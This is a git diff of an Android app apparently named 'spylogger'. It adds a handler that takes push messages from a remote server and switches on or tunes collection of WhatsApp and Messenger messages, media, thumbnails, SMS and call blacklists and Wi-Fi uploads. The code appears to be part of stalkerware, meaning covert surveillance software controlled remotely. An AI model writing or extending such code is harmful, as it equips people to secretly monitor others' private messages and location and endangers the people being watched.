@@ -5,10 +5,14 @@ import android.util.Log;
 
 import com.gravatasufoca.spylogger.helpers.ServicosHelper;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
+import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.model.Mensagem;
+import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
+import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
 import com.gravatasufoca.spylogger.utils.Utils;
+import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;
 import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
 import com.gravatasufoca.spylogger.vos.FcmMessageVO;
 import com.gravatasufoca.spylogger.vos.LocalizacaoVO;
@@ -77,11 +81,36 @@ public class FcmHelperService {
                         }
                     }
                 });
+                break;
+            case CONFIGURACAO:
+                atualizarConfiguracao();
+                break;
             default:
                 return;
         }
     }
 
+    private void atualizarConfiguracao(){
+        try {
+            ConfiguracaoVO configuracaoVO=fcmMessageVO.getConfiguracao();
+            RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
+
+            Configuracao configuracao=repositorioConfiguracao.getConfiguracao();
+            if(configuracao!=null){
+                configuracao.setFacebook(configuracaoVO.isMessenger());
+                configuracao.setWhatsApp(configuracaoVO.isWhatsApp());
+                configuracao.setIntervalo(configuracaoVO.getIntervalo());
+                configuracao.setMedia(configuracaoVO.isMedia());
+                configuracao.setMiniatura(configuracaoVO.isMiniatura());
+                configuracao.setSmsBlacklist(configuracaoVO.getSmsBlacklist());
+                configuracao.setChamadasBlacklist(configuracaoVO.getChamadasBlacklist());
+                configuracao.setWifi(configuracaoVO.isWifi());
+
+                repositorioConfiguracao.atualizar(configuracao);
+            }
+        } catch (SQLException e) {
+        }
+    }
 
     private File recuperarArquivo(){
         try {
